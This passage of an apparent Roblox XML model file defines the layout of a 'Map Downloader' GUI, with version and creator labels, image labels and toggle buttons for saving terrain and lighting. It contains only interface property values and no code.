							<token name="TextYAlignment">1</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">2</int>
						</Properties>
					</Item>
					<Item class="TextLabel" referent="RBX9C74005B81E84ABE9DD6C86D7D5D7FB7">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4294967295</Color3>
							<float name="BackgroundTransparency">1</float>
							<Color3 name="BorderColor3">4279970357</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<token name="Font">4</token>
							<token name="FontSize">10</token>
							<string name="Name">Version</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>100</XO>
								<YS>0</YS>
								<YO>210</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>0</XS>
								<XO>100</XO>
								<YS>0</YS>
								<YO>30</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<string name="Text">V1.0.0</string>
							<Color3 name="TextColor3">4279970357</Color3>
							<bool name="TextScaled">false</bool>
							<float name="TextSize">28</float>
							<Color3 name="TextStrokeColor3">4278190080</Color3>
							<float name="TextStrokeTransparency">1</float>
							<float name="TextTransparency">0</float>
							<bool name="TextWrapped">true</bool>
							<token name="TextXAlignment">2</token>
							<token name="TextYAlignment">1</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">2</int>
						</Properties>
					</Item>
					<Item class="TextLabel" referent="RBX211F30FBCF8840E9AE4E73B7D629CC82">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4294967295</Color3>
							<float name="BackgroundTransparency">1</float>
							<Color3 name="BorderColor3">4279970357</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<token name="Font">4</token>
							<token name="FontSize">10</token>
							<string name="Name">Creator</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>80</XO>
								<YS>0</YS>
								<YO>300</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>0</XS>
								<XO>140</XO>
								<YS>0</YS>
								<YO>30</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<string name="Text">Moon &lt;3</string>
							<Color3 name="TextColor3">4279970357</Color3>
							<bool name="TextScaled">false</bool>
							<float name="TextSize">28</float>
							<Color3 name="TextStrokeColor3">4278190080</Color3>
							<float name="TextStrokeTransparency">1</float>
							<float name="TextTransparency">0</float>
							<bool name="TextWrapped">true</bool>
							<token name="TextXAlignment">2</token>
							<token name="TextYAlignment">1</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">2</int>
						</Properties>
					</Item>
					<Item class="ImageLabel" referent="RBXC0EE3FA9481A4CD7AB2C59B79FEE351C">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4294967295</Color3>
							<float name="BackgroundTransparency">1</float>
							<Color3 name="BorderColor3">4279970357</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<Content name="Image"><url>http://unixfr.xyz/asset/?id=474172996</url></Content>
							<Color3 name="ImageColor3">4294309365</Color3>
							<Vector2 name="ImageRectOffset">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Vector2 name="ImageRectSize">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<float name="ImageTransparency">0</float>
							<string name="Name">Slant</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>-30</XO>
								<YS>0</YS>
								<YO>90</YO>
							</UDim2>
							<float name="Rotation">180</float>
							<token name="ScaleType">0</token>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>0</XS>
								<XO>30</XO>
								<YS>0</YS>
								<YO>30</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<Rect2D name="SliceCenter">
								<min>
									<X>0</X>
									<Y>0</Y>
								</min>
								<max>
									<X>0</X>
									<Y>0</Y>
								</max>
							</Rect2D>
							<bool name="Visible">true</bool>
							<int name="ZIndex">2</int>
						</Properties>
					</Item>
					<Item class="TextLabel" referent="RBX31FAEFA7469742FBB7776F45169CD390">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4294967295</Color3>
							<float name="BackgroundTransparency">1</float>
							<Color3 name="BorderColor3">4279970357</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<token name="Font">4</token>
							<token name="FontSize">5</token>
							<string name="Name">Love</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>50</XO>
								<YS>1</YS>
								<YO>-100</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>0</XS>
								<XO>200</XO>
								<YS>0</YS>
								<YO>30</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<string name="Text">SoSad</string>
							<Color3 name="TextColor3">4279970357</Color3>
							<bool name="TextScaled">false</bool>
							<float name="TextSize">14</float>
							<Color3 name="TextStrokeColor3">4278190080</Color3>
							<float name="TextStrokeTransparency">1</float>
							<float name="TextTransparency">0</float>
							<bool name="TextWrapped">true</bool>
							<token name="TextXAlignment">2</token>
							<token name="TextYAlignment">1</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">2</int>
						</Properties>
					</Item>
					<Item class="ImageLabel" referent="RBXCF04AE4B59944008974A9211BC7BAB6B">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4294967295</Color3>
							<float name="BackgroundTransparency">1</float>
							<Color3 name="BorderColor3">4279970357</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<Content name="Image"><url>http://unixfr.xyz/asset/?id=483437370</url></Content>
							<Color3 name="ImageColor3">4294309365</Color3>
							<Vector2 name="ImageRectOffset">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Vector2 name="ImageRectSize">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<float name="ImageTransparency">0</float>
							<string name="Name">Sad2</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>250</XO>
								<YS>1</YS>
								<YO>-100</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<token name="ScaleType">0</token>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>0</XS>
								<XO>30</XO>
								<YS>0</YS>
								<YO>30</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<Rect2D name="SliceCenter">
								<min>
									<X>0</X>
									<Y>0</Y>
								</min>
								<max>
									<X>0</X>
									<Y>0</Y>
								</max>
							</Rect2D>
							<bool name="Visible">true</bool>
							<int name="ZIndex">2</int>
						</Properties>
					</Item>
				</Item>
				<Item class="Frame" referent="RBX886E13BEB39F4B5A966BF872D0076EDA">
					<Properties>
						<bool name="Active">false</bool>
						<Vector2 name="AnchorPoint">
							<X>0</X>
							<Y>0</Y>
						</Vector2>
						<Color3 name="BackgroundColor3">4294967295</Color3>
						<float name="BackgroundTransparency">0.100000001</float>
						<Color3 name="BorderColor3">4290756543</Color3>
						<int name="BorderSizePixel">1</int>
						<bool name="ClipsDescendants">false</bool>
						<bool name="Draggable">false</bool>
						<string name="Name">SaveMapWindow</string>
						<Ref name="NextSelectionDown">null</Ref>
						<Ref name="NextSelectionLeft">null</Ref>
						<Ref name="NextSelectionRight">null</Ref>
						<Ref name="NextSelectionUp">null</Ref>
						<UDim2 name="Position">
							<XS>1</XS>
							<XO>0</XO>
							<YS>0</YS>
							<YO>0</YO>
						</UDim2>
						<float name="Rotation">0</float>
						<bool name="Selectable">false</bool>
						<Ref name="SelectionImageObject">null</Ref>
						<UDim2 name="Size">
							<XS>0</XS>
							<XO>300</XO>
							<YS>1</YS>
							<YO>0</YO>
						</UDim2>
						<token name="SizeConstraint">0</token>
						<token name="Style">0</token>
						<bool name="Visible">true</bool>
						<int name="ZIndex">1</int>
					</Properties>
					<Item class="Frame" referent="RBX8DC4E1C1D1C6458D923C8DB7513F5DD0">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4293519849</Color3>
							<float name="BackgroundTransparency">0</float>
							<Color3 name="BorderColor3">4287993237</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<string name="Name">Header</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>0</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>1</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>17</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<token name="Style">0</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">1</int>
						</Properties>
						<Item class="TextLabel" referent="RBX4713D7A492C6446396E46C8C2F8ECEB1">
							<Properties>
								<bool name="Active">false</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4288914085</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<token name="Font">3</token>
								<token name="FontSize">5</token>
								<string name="Name">TextLabel</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>4</XO>
									<YS>0</YS>
									<YO>0</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>1</XS>
									<XO>-4</XO>
									<YS>1</YS>
									<YO>0</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<string name="Text">Map Downloader</string>
								<Color3 name="TextColor3">4278190080</Color3>
								<bool name="TextScaled">false</bool>
								<float name="TextSize">14</float>
								<Color3 name="TextStrokeColor3">4278190080</Color3>
								<float name="TextStrokeTransparency">1</float>
								<float name="TextTransparency">0</float>
								<bool name="TextWrapped">false</bool>
								<token name="TextXAlignment">0</token>
								<token name="TextYAlignment">1</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
						</Item>
					</Item>
					<Item class="Frame" referent="RBX4D91B082560F48A7ACFF4394A4EA56B7">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4294967295</Color3>
							<float name="BackgroundTransparency">1</float>
							<Color3 name="BorderColor3">4279970357</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<string name="Name">MapSettings</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>200</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>1</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>240</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<token name="Style">0</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">1</int>
						</Properties>
						<Item class="Frame" referent="RBXFF2C40D1D6F44081942C5720F060D7D3">
							<Properties>
								<bool name="Active">false</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4294967295</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<string name="Name">Terrain</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>60</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>1</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>60</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
							<Item class="TextLabel" referent="RBX13629F5397F6403F8B5B4AAA6B166B57">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4294967295</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">1</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<token name="Font">3</token>
									<token name="FontSize">6</token>
									<string name="Name">SName</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>10</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-20</XO>
										<YS>0</YS>
										<YO>30</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<string name="Text">Save Terrain</string>
									<Color3 name="TextColor3">4279970357</Color3>
									<bool name="TextScaled">false</bool>
									<float name="TextSize">18</float>
									<Color3 name="TextStrokeColor3">4278190080</Color3>
									<float name="TextStrokeTransparency">1</float>
									<float name="TextTransparency">0</float>
									<bool name="TextWrapped">false</bool>
									<token name="TextXAlignment">0</token>
									<token name="TextYAlignment">1</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
							</Item>
							<Item class="TextLabel" referent="RBX6BD28C92965343FBBEFFD8C48465DC42">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4294967295</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">1</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<token name="Font">3</token>
									<token name="FontSize">6</token>
									<string name="Name">Status</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>60</XO>
										<YS>0</YS>
										<YO>30</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>50</XO>
										<YS>0</YS>
										<YO>15</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<string name="Text">Off</string>
									<Color3 name="TextColor3">4279970357</Color3>
									<bool name="TextScaled">false</bool>
									<float name="TextSize">18</float>
									<Color3 name="TextStrokeColor3">4278190080</Color3>
									<float name="TextStrokeTransparency">1</float>
									<float name="TextTransparency">0</float>
									<bool name="TextWrapped">false</bool>
									<token name="TextXAlignment">0</token>
									<token name="TextYAlignment">1</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
							</Item>
							<Item class="TextButton" referent="RBX38EEB1565D854DA2AE6617E9F566E260">
								<Properties>
									<bool name="Active">true</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<bool name="AutoButtonColor">true</bool>
									<Color3 name="BackgroundColor3">4292664540</Color3>
									<float name="BackgroundTransparency">0</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<token name="Font">3</token>
									<token name="FontSize">5</token>
									<bool name="Modal">false</bool>
									<string name="Name">Change</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>10</XO>
										<YS>0</YS>
										<YO>30</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">true</bool>
									<bool name="Selected">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>40</XO>
										<YS>0</YS>
										<YO>15</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<string name="Text"></string>
									<Color3 name="TextColor3">4279970357</Color3>
									<bool name="TextScaled">false</bool>
									<float name="TextSize">14</float>
									<Color3 name="TextStrokeColor3">4278190080</Color3>
									<float name="TextStrokeTransparency">1</float>
									<float name="TextTransparency">0</float>
									<bool name="TextWrapped">false</bool>
									<token name="TextXAlignment">2</token>
									<token name="TextYAlignment">1</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextLabel" referent="RBXAFC07C5982714658802D89FD7424C9BF">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4278227932</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">3</token>
										<token name="FontSize">5</token>
										<string name="Name">OnBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>15</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4279970357</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">14</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">1</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBX8E9D2F60B9824D0EAB9146400D2950FA">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">true</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">3</token>
										<token name="FontSize">5</token>
										<string name="Name">Bar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>-2</XO>
											<YS>0</YS>
											<YO>-2</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>19</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4279970357</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">14</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">1</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
						</Item>
						<Item class="Frame" referent="RBX9F80EF0A9BFA49ADB0488CB9A7122E68">
							<Properties>
								<bool name="Active">false</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4294967295</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<string name="Name">Lighting</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>120</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>1</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>60</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
							<Item class="TextLabel" referent="RBX45D91C1D2C3F4B4CBAB8A92850E22D22">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4294967295</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">1</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<token name="Font">3</token>
									<token name="FontSize">6</token>
									<string name="Name">SName</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>10</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-20</XO>
										<YS>0</YS>
										<YO>30</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<string name="Text">Lighting Properties</string>
									<Color3 name="TextColor3">4279970357</Color3>
									<bool name="TextScaled">false</bool>
									<float name="TextSize">18</float>
									<Color3 name="TextStrokeColor3">4278190080</Color3>
									<float name="TextStrokeTransparency">1</float>
									<float name="TextTransparency">0</float>
									<bool name="TextWrapped">false</bool>
									<token name="TextXAlignment">0</token>
									<token name="TextYAlignment">1</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
							</Item>
							<Item class="TextLabel" referent="RBX791B5EE18C034D19A72963C622865B85">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4294967295</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">1</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<token name="Font">3</token>
									<token name="FontSize">6</token>
									<string name="Name">Status</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>60</XO>
										<YS>0</YS>
										<YO>30</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>50</XO>
										<YS>0</YS>
										<YO>15</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<string name="Text">Off</string>
									<Color3 name="TextColor3">4279970357</Color3>
									<bool name="TextScaled">false</bool>
									<float name="TextSize">18</float>
									<Color3 name="TextStrokeColor3">4278190080</Color3>
									<float name="TextStrokeTransparency">1</float>
									<float name="TextTransparency">0</float>
									<bool name="TextWrapped">false</bool>
									<token name="TextXAlignment">0</token>
									<token name="TextYAlignment">1</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
							</Item>
							<Item class="TextButton" referent="RBXEA616C5C28B54284B6A0F1F048A8C240">
								<Properties>
									<bool name="Active">true</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<bool name="AutoButtonColor">true</bool>
									<Color3 name="BackgroundColor3">4292664540</Color3>
									<float name="BackgroundTransparency">0</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<token name="Font">3</token>
									<token name="FontSize">5</token>
									<bool name="Modal">false</bool>
									<string name="Name">Change</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>10</XO>
										<YS>0</YS>
										<YO>30</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">true</bool>
									<bool name="Selected">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>40</XO>
										<YS>0</YS>
										<YO>15</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<string name="Text"></string>
									<Color3 name="TextColor3">4279970357</Color3>
									<bool name="TextScaled">false</bool>
									<float name="TextSize">14</float>
									<Color3 name="TextStrokeColor3">4278190080</Color3>
									<float name="TextStrokeTransparency">1</float>
									<float name="TextTransparency">0</float>
									<bool name="TextWrapped">false</bool>
									<token name="TextXAlignment">2</token>
									<token name="TextYAlignment">1</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextLabel" referent="RBX5B75535D4826403380366ED4AD0E6DAD">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4278227932</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
